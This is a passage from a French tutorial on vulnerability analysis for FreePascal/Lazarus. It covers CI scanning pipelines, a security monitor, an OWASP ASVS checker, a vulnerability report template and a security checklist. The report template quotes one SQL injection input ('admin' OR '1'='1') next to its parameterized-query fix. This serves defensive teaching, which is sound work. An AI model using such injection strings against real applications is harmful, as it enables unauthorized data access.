### Script pour GitHub Actions

```yaml
# .github/workflows/security-scan.yml
name: Security Vulnerability Scan

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main ]

jobs:
  security-scan:
    runs-on: ubuntu-latest

    steps:
    - uses: actions/checkout@v2

    - name: Setup FreePascal
      run: |
        sudo apt-get update
        sudo apt-get install -y fpc

    - name: Run Vulnerability Scanner
      run: |
        fpc VulnerabilityAutoScan.pas
        ./VulnerabilityAutoScan

    - name: Upload Report
      uses: actions/upload-artifact@v2
      with:
        name: vulnerability-report
        path: vulnerability_report.txt

    - name: Check for Critical Issues
      run: |
        if grep -q "CRITICAL" vulnerability_report.txt; then
          echo "Critical vulnerabilities found!"
          exit 1
        fi
```

### GitLab CI

```yaml
# .gitlab-ci.yml
security_scan:
  stage: test
  script:
    - apt-get update && apt-get install -y fpc
    - fpc VulnerabilityAutoScan.pas
    - ./VulnerabilityAutoScan
    - |
      if grep -q "CRITICAL" vulnerability_report.txt; then
        echo "Critical vulnerabilities detected!"
        exit 1
      fi
  artifacts:
    paths:
      - vulnerability_report.txt
    expire_in: 1 week
  only:
    - merge_requests
    - main
```

## Surveillance continue

### Monitoring des vulnérabilités en production

```pascal
type
  TSecurityMonitor = class
  private
    FAlertThreshold: Integer;
    FMonitoringEnabled: Boolean;
    procedure CheckAnomalies;
    procedure SendAlert(const AlertType, Message: string);
  public
    constructor Create;
    procedure MonitorAuthenticationAttempts;
    procedure MonitorDataAccess;
    procedure MonitorSystemCalls;
    procedure MonitorNetworkTraffic;
    procedure Start;
    procedure Stop;
  end;

constructor TSecurityMonitor.Create;  
begin
  inherited Create;
  FAlertThreshold := 5;
  FMonitoringEnabled := False;
end;

procedure TSecurityMonitor.MonitorAuthenticationAttempts;  
var
  FailedAttempts: TDictionary<string, Integer>;
  Username: string;
  Count: Integer;
begin
  // Surveiller les tentatives d'authentification
  for Username in FailedAttempts.Keys do
  begin
    Count := FailedAttempts[Username];

    if Count >= FAlertThreshold then
    begin
      SendAlert('BRUTE_FORCE',
        Format('User %s: %d failed attempts', [Username, Count]));

      // Bloquer temporairement
      BlockUser(Username, 300); // 5 minutes
    end;
  end;
end;

procedure TSecurityMonitor.MonitorDataAccess;  
var
  AccessCount: Integer;
  TimeWindow: TDateTime;
begin
  // Détecter les accès anormaux
  TimeWindow := Now - (1 / 24); // Dernière heure
  AccessCount := GetDataAccessCount(TimeWindow);

  if AccessCount > 1000 then // Seuil anormal
  begin
    SendAlert('ABNORMAL_ACCESS',
      Format('Unusual data access: %d requests in 1 hour', [AccessCount]));
  end;
end;

procedure TSecurityMonitor.SendAlert(const AlertType, Message: string);  
begin
  // Log
  WriteLnToLog(Format('[SECURITY_ALERT] %s: %s', [AlertType, Message]));

  // Email
  SendEmailAlert(AdminEmail, AlertType, Message);

  // Webhook (Slack, Discord, etc.)
  SendWebhookAlert(WebhookURL, AlertType, Message);
end;
```

## Conformité et standards

### Vérification OWASP ASVS

```pascal
type
  TASVSCompliance = class
  public
    class function CheckLevel1Compliance: Boolean;
    class function CheckLevel2Compliance: Boolean;
    class function CheckLevel3Compliance: Boolean;
    class procedure GenerateComplianceReport;
  end;

class function TASVSCompliance.CheckLevel1Compliance: Boolean;  
var
  Checks: TStringList;
  AllPassed: Boolean;
begin
  Checks := TStringList.Create;
  try
    AllPassed := True;

    // V1: Architecture, Design and Threat Modeling
    if not VerifyThreatModelExists then
    begin
      Checks.Add('FAIL: V1.1 - No threat model documented');
      AllPassed := False;
    end;

    // V2: Authentication
    if not VerifyPasswordPolicy then
    begin
      Checks.Add('FAIL: V2.1 - Weak password policy');
      AllPassed := False;
    end;

    // V3: Session Management
    if not VerifySecureSessionManagement then
    begin
      Checks.Add('FAIL: V3.1 - Insecure session management');
      AllPassed := False;
    end;

    // V5: Validation, Sanitization and Encoding
    if not VerifyInputValidation then
    begin
      Checks.Add('FAIL: V5.1 - Input validation missing');
      AllPassed := False;
    end;

    // V6: Cryptography
    if not VerifyCryptographicControls then
    begin
      Checks.Add('FAIL: V6.1 - Weak cryptography');
      AllPassed := False;
    end;

    // V7: Error Handling and Logging
    if not VerifyErrorHandling then
    begin
      Checks.Add('FAIL: V7.1 - Insecure error handling');
      AllPassed := False;
    end;

    // Rapport
    WriteLn('=== ASVS Level 1 Compliance Check ===');
    for var Check in Checks do
      WriteLn(Check);

    if AllPassed then
      WriteLn('✓ COMPLIANT')
    else
      WriteLn('✗ NON-COMPLIANT');

    Result := AllPassed;
  finally
    Checks.Free;
  end;
end;
```

## Documentation des vulnérabilités

### Template de rapport de vulnérabilité

````markdown
# Vulnerability Report

## Summary
**ID**: VULN-2024-001  
**Title**: SQL Injection in User Search  
**Severity**: High (CVSS 8.2)  
**Status**: Fixed  
**Discovered**: 2024-01-15  
**Fixed**: 2024-01-16  

## Description
The user search functionality in UserSearchForm.pas is vulnerable to SQL injection  
due to direct string concatenation in SQL query construction.

## Affected Components
- File: UserSearchForm.pas
- Function: SearchButtonClick
- Line: 42
- Version: 1.0.0 - 1.2.3

## Impact
An attacker can:
- Extract sensitive data from the database
- Bypass authentication
- Modify or delete data
- Execute administrative operations

## Exploitation
```pascal
// Input: admin' OR '1'='1
// Resulting query: SELECT * FROM users WHERE username = 'admin' OR '1'='1'
// Result: Returns all users
```

## Fix
Replace string concatenation with parameterized queries:
```pascal
Query.SQL.Text := 'SELECT * FROM users WHERE username = :username';  
Query.ParamByName('username').AsString := EditUsername.Text;
```

## Testing
- [x] Unit tests added
- [x] Manual testing completed
- [x] Penetration testing passed
- [x] Code review approved

## References
- CWE-89: SQL Injection
- OWASP A03:2021 - Injection

## Timeline
- 2024-01-15 10:30: Discovered during security audit
- 2024-01-15 11:00: Reported to development team
- 2024-01-15 14:00: Fix developed
- 2024-01-16 09:00: Fix tested and deployed
- 2024-01-16 10:00: Verified in production
````

## Ressources et outils

### Outils d'analyse statique

**Pour FreePascal/Pascal** :
- **PasVulnScan** : Scanner de vulnérabilités Pascal (à développer)
- **grep/ripgrep** : Recherche de patterns dangereux
- **Custom scripts** : Scripts de détection personnalisés

**Génériques** :
- **SonarQube** : Plateforme d'analyse de code
- **SAST tools** : Static Application Security Testing

### Outils d'analyse dynamique

- **Valgrind** : Détection de fuites mémoire (Linux)
- **Dr. Memory** : Détection de problèmes mémoire (Windows)
- **Fuzzing frameworks** : AFL, libFuzzer

### Bases de données de vulnérabilités

- **NVD (National Vulnerability Database)** : https://nvd.nist.gov/
- **CVE Details** : https://www.cvedetails.com/
- **OWASP** : https://owasp.org/

### Standards et frameworks

- **OWASP Top 10** : https://owasp.org/www-project-top-ten/
- **CWE** : https://cwe.mitre.org/
- **ASVS** : Application Security Verification Standard
- **CVSS** : Common Vulnerability Scoring System

## Bonnes pratiques

### Checklist de sécurité pour développeurs

**Avant le commit** :
- [ ] Toutes les entrées utilisateur sont validées
- [ ] Aucun credential en dur dans le code
- [ ] Utilisation de requêtes paramétrées
- [ ] Gestion d'erreurs sécurisée (pas de fuites d'info)
- [ ] Logging des événements de sécurité
- [ ] Code reviewé par un pair

**Avant le déploiement** :
- [ ] Scan de vulnérabilités exécuté
- [ ] Tests de pénétration effectués
- [ ] Dépendances à jour
- [ ] Configuration sécurisée
- [ ] Certificats SSL valides
- [ ] Backup et plan de récupération

**En production** :
- [ ] Monitoring actif
- [ ] Logs de sécurité surveillés
- [ ] Alertes configurées
- [ ] Patches appliqués rapidement
- [ ] Audits réguliers

### Culture de sécurité

**Formation continue** :
- Sessions de sensibilisation à la sécurité
- Veille sur les nouvelles vulnérabilités
- Participation à des CTF (Capture The Flag)
- Lectures recommandées

**Principe du moindre privilège** :
- Accès minimal nécessaire
- Revue régulière des permissions
- Rotation des credentials

**Defense in depth** :
- Plusieurs couches de sécurité
- Pas de single point of failure
- Redondance des contrôles

## Conclusion

L'analyse de vulnérabilités est un processus continu et essentiel pour maintenir la sécurité de vos applications. Elle nécessite :

**🔍 Détection** :
- Outils automatisés (SAST, DAST)
- Code reviews manuels
- Pentesting régulier
- Fuzzing et tests d'intrusion

**🛠️ Correction** :
- Priorisation selon la gravité
- Correctifs testés et documentés
- Déploiement rapide
- Vérification post-correction

**📊 Prévention** :
- Formation des développeurs
- Standards de codage sécurisé
- Intégration dans le CI/CD
- Culture de sécurité

**🔄 Amélioration continue** :
- Retours d'expérience
- Mise à jour des connaissances
- Adaptation aux nouvelles menaces
- Audits réguliers

Avec FreePascal et Lazarus, bien que moins d'outils soient disponibles comparé à d'autres langages, vous pouvez créer vos propres scanners et intégrer des bonnes pratiques de sécurité dès la conception de vos applications.

**Points clés** :
- ✅ Validez TOUTES les entrées utilisateur
- ✅ N'utilisez JAMAIS de concaténation pour SQL/commandes
- ✅ Stockez les credentials de manière sécurisée
- ✅ Gérez les erreurs sans fuites d'information
- ✅ Loggez les événements de sécurité
- ✅ Testez régulièrement
- ✅ Restez informé des nouvelles vulnérabilités

La sécurité n'est pas une fonctionnalité qu'on ajoute à la fin, c'est un processus continu qui doit être intégré dès le début du développement.

**Prochaine section** : 17.8 Obfuscation et protection du code

⏭️ [Obfuscation et protection du code](/17-securite-cryptographie/08-obfuscation-protection-code.md)
